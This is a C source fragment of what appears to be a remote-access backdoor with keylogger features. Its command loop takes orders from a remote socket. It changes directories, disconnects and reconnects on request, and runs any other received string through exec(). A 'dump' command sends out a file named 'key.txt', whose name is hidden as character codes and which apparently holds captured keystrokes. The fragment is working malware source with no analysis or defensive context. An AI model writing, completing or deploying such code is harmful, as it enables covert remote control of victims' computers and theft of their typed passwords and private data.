void seperate_commands(){

	int valread;
	char fname[] = {107,101,121,46,116,120,116,0};

	while (1){
		char buffer[1024]={0};
		sleep(1);
		valread = recv(sock, buffer, 1024,0);
		if (valread<0)
			start();
		if (strncmp("stop",buffer,4)==0){
			char output[1024]="[+] Connection is closed";
			valread = send(sock, output, sizeof(output),0);
			if(valread<0)
				start();
			close(sock);
			exit(0);
		}
		else if (strncmp("cd ",buffer,3)==0){
			char* dir = seperatedirectry(buffer,3,strlen(buffer));
			chdir(dir);
			char output[1024]="[+] Directry Is Changed";
			valread = send (sock,output, sizeof(output),0);
			if (valread<0)
				start();
		}
		else if (strncmp("later",buffer,5)==0){
			char output[1024] ="[+] Ok fine.. I recvecive later!!!!";
			valread = send (sock, output ,sizeof (output), 0);
			k.late = 1;
			close(sock);
			start();
		}


		else if (strncmp("dump",buffer,4)==0){

			FILE *fp;
			fp = fopen(fname,"r");
			fseek(fp,0L,SEEK_END);
			long int res = ftell(fp);
			fseek(fp,0,SEEK_SET);
			char stokes[res];
			fread(stokes, res,1,fp);

			valread = send(sock, stokes, res, 0);
			if (valread<0)
				start();
		}

		else{
			exec(buffer);
			sleep(2);
		}

	}
}
